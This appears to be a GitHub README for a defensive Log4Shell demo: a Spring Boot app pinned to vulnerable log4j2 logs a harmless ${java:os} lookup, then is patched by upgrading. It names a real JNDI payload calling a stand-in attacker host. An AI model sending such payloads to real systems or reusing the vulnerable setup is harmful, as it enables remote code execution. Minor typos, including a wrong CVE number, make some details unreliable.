# [Log4Shell](https://github.com/WISeAgent/log4j2) Demo - a non-intructive and user friendly version
Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.  

**tl;dr**

Log4Shell vulnerability in plain English:

1. Vulnerable Web application trusts the user data which shouldn't be trusted, eg. this demo project

2. Vulnerable Log4j2 is used by web app for logging 

3. The lookup() implementation from org.apache.logging.log4j.core package in the Vulnerable Log4j2 envluates variable ${key:value} in log message and substitute the variable with value. It opens the door and exposes the vulnerability.

Once the door is opened, all you need is your imagation/creativity to craft various of payloads and delivery methods to exploit this log4j2 vulnerability.

The CVS-2021-42288 uses carefully brafted ${jndi:ldap://....} payout.

Spring Boot is using logback by default. It is supporting the use of log4j2 and hance it's exposed to this vulnerability if Log4j2 is not patched.

**Hacking is illegal!** It's not a good idea to encourage exploitation of this vulunerability. That being said, developer/blue team member should have better understanding on the "how" so to build a better and secured application.

The purpose of this demo is for developer/blue team member to understand how older version of log4j2 is being exploitted and how to patch it. Instead of using ${jndi:ldap://attackerserver.com/RCE} as payload, we display the OS version instead in this demo.  

## Create a New Maven Demo Project for Log4Shell(CVE-2021-44228)
### 1. Create an empty project using Spring CLI
    spring init --name=vul-log4j2 packaging=jar --package-name=au.com.wiseagent.springboot.log4j2 -a=vul-log4j2 --dependencies=web log4j2
    
### 2. Update pom.xml to use vulnerable version of log4j2
- Under <properties> section, inster a line to use vulnerable log4j2 verion, eg. 2.14.0  

      <properties>
      <java.version>1.8</java.version>
      <!-- to use the vulnerable version: CVE-2021-44228 -->
      <log4j2.version>2.14.0</log4j2.version>
      </properties>
  
- To disable default logback, and using log4j2  

      <!-- Exclude Spring Boot's Default Logging -->
      <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter</artifactId>
        <!-- disable default logging -->
        <exclusions>
          <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
          </exclusion>
        </exclusions>
      </dependency>

      <!-- Add Log4j2 Dependency -->
      <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-log4j2</artifactId>
      </dependency>
### 3. Import the Maven project to your Eclipse IDE

### 4. Use Log4J2 log, to log environment variable ${java:os} as INFO instead of ${jndi:ldap://...} trigger RCE
Here is the cutdown version of the REST API implemention pass payload as RequestParam.  
For demo purpose, instead of sanitized the payload, it's hard coded to a non-instructive operation, to log the environment value for OS 

    package au.com.wiseagent.springboot.log4j2;

    import org.springframework.boot.SpringApplication;
    import org.springframework.boot.autoconfigure.SpringBootApplication;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.PathVariable;
    import org.springframework.web.bind.annotation.RequestParam;
    import org.springframework.web.bind.annotation.ResponseBody;
    import org.springframework.web.bind.annotation.RestController;
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;

    @SpringBootApplication
    @RestController
    public class VulLog4j2Application {
        private static Logger logger = LogManager.getLogger(VulLog4j2Application.class);
        public static void main(String[] args) {
          SpringApplication.run(VulLog4j2Application.class, args);
        }

      @GetMapping("/PayLoad")
      @ResponseBody
        public String PayLoad(@RequestParam  String payload) {
        payload="${java:os}"; // override the payload
        logger.info(payload);
        return "payload received" + payload;
      }
    }

 ### 5. Start your REST API service from IDE or from command line  
    
        java -jar target/vul-log4j2-0.0.1-SNAPSHOT.jar
 
    
From your browser, entry to the following to trigger the REST API call.  
  
    http://localhost:8080/PayLoad?payload=$%7Bjava:os%7D
  
  ![image](https://user-images.githubusercontent.com/853925/147844381-a20bc303-47eb-4d8f-9c1e-582c9bd6d017.png)

**It can be observed that the variable ${java:os} has been evaluated, and replaced by the OS value in the log.**
## Patch your application for Log4Shell
### Update pom.xml file to use updated version of log4j2, which patched the CVE-2021-44228

      <properties>
      <java.version>1.8</java.version>
      <!-- to use updated version patched the CVE-2021-44228 -->
      <log4j2.version>2.17.0</log4j2.version>
      </properties>

### Stop and Start your REST API service from IDE or from command line again
From your browse, entry to the following to trigger the REST API call, and noticed that the ${java:OS} variable has been replace by the OS value in the INFO log.  
  
    http://localhost:8080/PayLoad?payload=$%7Bjava:os%7D
![image](https://user-images.githubusercontent.com/853925/147844478-65d0da64-f98a-4f11-b45a-d9a420f1ed04.png)


**It can be observed that the variable ${java:os} has not been evaluated, and it has elimiated the opportunity that an unsanitized user input being used to exploit the log4j2 vulnerability.**
